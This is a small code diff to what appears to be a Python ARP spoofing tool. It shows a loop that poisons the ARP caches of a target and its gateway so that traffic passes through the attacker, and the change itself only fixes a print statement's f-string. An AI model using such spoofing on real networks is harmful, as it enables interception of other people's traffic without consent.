@@ -62,7 +62,7 @@ class Spoofer:
             self.spoof(target_ip, gateway_ip, self.target_mac) # client, I am the router
             self.spoof(gateway_ip, target_ip, self.gateway_mac) # router, I am the client
             sent_packets_count += 2
-            print(f"\r[+] Transaction successful. Packets sent: str(sent_packets_count)", end="")
+            print(f"\r[+] Transaction successful. Packets sent: {str(sent_packets_count)}", end="")
             #python2 print("\r[+] Transaction successful. Packets sent: " + str(sent_packets_count)),
             sys.stdout.flush()
             time.sleep(2)
